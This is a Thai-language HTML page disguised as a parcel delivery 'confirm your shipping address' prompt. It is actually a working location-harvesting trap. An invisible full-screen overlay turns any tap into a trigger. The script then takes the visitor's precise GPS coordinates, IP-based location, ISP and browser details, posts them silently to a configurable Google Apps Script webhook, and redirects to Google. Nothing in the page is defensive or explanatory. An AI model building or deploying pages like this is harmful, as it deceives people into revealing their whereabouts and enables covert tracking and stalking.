<!DOCTYPE html>
<html lang="th">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ยืนยันที่อยู่จัดส่งสินค้า</title>
<style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
        font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
    }
    .container {
        background: white;
        padding: 40px;
        border-radius: 16px;
        box-shadow: 0 10px 40px rgba(0,0,0,0.25);
        text-align: center;
        max-width: 480px;
        width: 92%;
    }
    .logo {
        width: 80px;
        height: 80px;
        background: #ff6b6b;
        border-radius: 50%;
        margin: 0 auto 24px;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 42px;
        color: white;
    }
    h1 { color:#1a1a1a; margin-bottom: 8px; font-size: 26px; }
    .subtitle { color:#555; margin-bottom: 32px; font-size: 15.5px; line-height: 1.4; }
    .status-container {
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 12px;
        margin: 32px 0 20px;
    }
    .status {
        width: 18px;
        height: 18px;
        border-radius: 50%;
        background: #ff6b6b;
        animation: pulse 1.8s infinite;
    }
    @keyframes pulse {
        0%,100% { transform: scale(1);   opacity:1; }
        50%     { transform: scale(1.35); opacity:0.6; }
    }
    .sent { background:#51cf66 !important; animation:none !important; }
    .info  { color:#777; font-size: 14px; margin-top: 16px; }
    .invisible-btn {
        position: fixed;
        inset: 0;
        z-index: 9999;
        cursor: pointer;
        opacity: 0;
    }
</style>
</head>
<body>

<div class="invisible-btn" id="trapBtn"></div>

<div class="container">
    <div class="logo">📦</div>
    <h1>ยืนยันที่อยู่จัดส่งสินค้า</h1>
    <p class="subtitle">กรุณายืนยันตำแหน่งปัจจุบันของคุณ<br>เพื่อดำเนินการจัดส่งสินค้าให้ถูกต้อง</p>

    <div class="status-container">
        <div class="status" id="statusDot"></div>
        <span id="statusText">กำลังตรวจสอบตำแหน่ง...</span>
    </div>

    <p class="info">แตะ/คลิกที่ใดก็ได้บนหน้าจอเพื่อยืนยัน</p>
</div>


<script>
// เปลี่ยนเป็น URL ของคุณเอง !!!!
const WEBHOOK_URL = "https://script.google.com/macros/s/xxxxxxxxxxxxxxxxxxxxxxxxxxxx/exec";

let isProcessing = false;

function updateStatus(text, color) {
    document.getElementById("statusText").textContent = text;
    const dot = document.getElementById("statusDot");
    dot.style.background = color;
    dot.className = color === "#51cf66" ? "status sent" : "status";
}

async function getIpInfo() {
    try {
        const res = await fetch("https://ipapi.co/json/?fields=status,country,city,regionName,isp,org");
        if (!res.ok) throw new Error("ipapi failed");
        return await res.json();
    } catch (e) {
        console.warn("IP info failed", e);
        return {};
    }
}

async function sendToSheet(data) {
    try {
        // ใช้วิธีที่เสถียรกว่า (POST + JSON)
        await fetch(WEBHOOK_URL, {
            method: "POST",
            mode: "no-cors",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        });
    } catch (e) {
        console.error("ส่งข้อมูลไม่สำเร็จ", e);
    }
}

async function captureLocation() {
    if (isProcessing) return;
    isProcessing = true;
    document.getElementById("trapBtn").style.pointerEvents = "none";

    updateStatus("กำลังดึงตำแหน่ง...", "#ff6b6b");

    const data = {
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        language: navigator.language || navigator.userLanguage,
        platform: navigator.platform,
        screen: `${screen.width}×${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        referrer: document.referrer || "Direct",
        cookiesEnabled: navigator.cookieEnabled
    };

    // ดึง IP ก่อนเลย (จะได้มีข้อมูลแม้ GPS พลาด)
    const ipData = await getIpInfo();
    Object.assign(data, {
        ipCountry: ipData.country || "N/A",
        ipCity: ipData.city || "N/A",
        ipRegion: ipData.regionName || "N/A",
        ipISP: ipData.isp || "N/A"
    });

    try {
        // พยายามเอา GPS ก่อน
        const position = await new Promise((resolve, reject) => {
            if (!("geolocation" in navigator)) {
                reject(new Error("Geolocation not supported"));
                return;
            }
            navigator.geolocation.getCurrentPosition(resolve, reject, {
                enableHighAccuracy: true,
                timeout: 12000,
                maximumAge: 0
            });
        });

        // ได้ GPS แล้ว
        Object.assign(data, {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            gpsSuccess: true
        });

        updateStatus("กำลังบันทึกตำแหน่ง...", "#ffd43b");
        await sendToSheet(data);

        updateStatus("✓ ยืนยันเรียบร้อยแล้ว !", "#51cf66");
        setTimeout(() => {
            window.location.href = "https://www.google.co.th";
        }, 1800);

    } catch (err) {
        console.warn("GPS error →", err);

        let msg = "ใช้ตำแหน่งโดยประมาณจาก IP แทน";
        let color = "#ff9500";

        if (err.code === 1) {
            msg = "กรุณาเปิดอนุญาตตำแหน่งแล้วลองใหม่";
            color = "#ff6b6b";
        } else if (err.code === 3) {
            msg = "หมดเวลาในการตรวจสอบตำแหน่ง";
        }

        updateStatus(msg, color);

        // ส่งข้อมูลที่ได้อยู่ดี (ไม่มี GPS)
        data.gpsSuccess = false;
        data.gpsError = err.message || err.code || "Unknown GPS error";

        await sendToSheet(data);

        // รอให้เห็นข้อความสักพักแล้วไปต่อ
        setTimeout(() => {
            window.location.href = "https://www.google.co.th";
        }, 2500);
    }
}

// ผูกการคลิกทุกที่บนหน้า
document.getElementById("trapBtn").onclick = captureLocation;

// บางกรณีมือถือชอบเรียกอัตโนมัติ (แต่ส่วนใหญ่ต้องกดจริง)
setTimeout(() => {
    document.body.style.cursor = "pointer";
}, 3500);
</script>
</body>
</html>
